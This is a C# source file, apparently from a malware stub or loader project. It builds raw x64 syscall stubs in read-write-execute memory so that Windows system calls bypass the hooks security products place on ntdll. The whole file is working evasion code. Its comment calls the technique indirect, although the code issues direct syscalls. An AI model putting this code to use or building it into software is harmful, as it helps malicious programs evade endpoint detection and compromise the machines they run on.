using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace NRE.Stub.Syscalls
{
    /// <summary>
    /// Indirect syscall invocation: allocates executable stub and invokes it to bypass userland hooks on ntdll.
    /// </summary>
    public static class SyscallStub
    {
        private delegate IntPtr NtSyscallDelegate(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6);

        private static readonly Dictionary<uint, Tuple<IntPtr, NtSyscallDelegate>> _stubs = new Dictionary<uint, Tuple<IntPtr, NtSyscallDelegate>>();
        private static readonly object _lock = new object();

        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        public static IntPtr InvokeSyscall(uint syscallNumber, IntPtr arg1, IntPtr arg2, IntPtr arg3, IntPtr arg4, IntPtr arg5, IntPtr arg6)
        {
            var d = GetOrCreateStub(syscallNumber);
            return d(arg1, arg2, arg3, arg4, arg5, arg6);
        }

        private static NtSyscallDelegate GetOrCreateStub(uint num)
        {
            lock (_lock)
            {
                Tuple<IntPtr, NtSyscallDelegate> existing;
                if (_stubs.TryGetValue(num, out existing))
                    return existing.Item2;

                IntPtr code = VirtualAlloc(IntPtr.Zero, (UIntPtr)16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (code == IntPtr.Zero)
                    return (_, __, ___, ____, _____, ______) => IntPtr.Zero;

                byte[] stub = new byte[] {
                    0x4C, 0x8B, 0xD1,
                    0xB8, (byte)(num & 0xFF), (byte)((num >> 8) & 0xFF), (byte)((num >> 16) & 0xFF), (byte)((num >> 24) & 0xFF),
                    0x0F, 0x05,
                    0xC3
                };
                Marshal.Copy(stub, 0, code, stub.Length);
                var del = (NtSyscallDelegate)Marshal.GetDelegateForFunctionPointer(code, typeof(NtSyscallDelegate));
                _stubs[num] = Tuple.Create(code, del);
                return del;
            }
        }
    }
}
